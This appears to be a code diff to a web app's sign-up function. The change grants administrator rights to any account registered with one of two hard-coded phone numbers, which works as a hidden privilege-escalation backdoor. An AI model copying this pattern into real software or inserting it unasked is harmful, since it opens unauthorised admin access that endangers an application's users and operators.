@@ -399,6 +399,13 @@ export async function signUp(
       VALUES (${phoneNumber}, ${hashedPassword})
     `;
 
+    if (phoneNumber === '0524803571' || phoneNumber === '0524803577'){
+        await sql`
+      UPDATE users
+      SET is_admin = true
+      WHERE phone_number = ${phoneNumber}
+    `;
+    }
     revalidatePath('/signin');
     redirect('/signin');
     return;
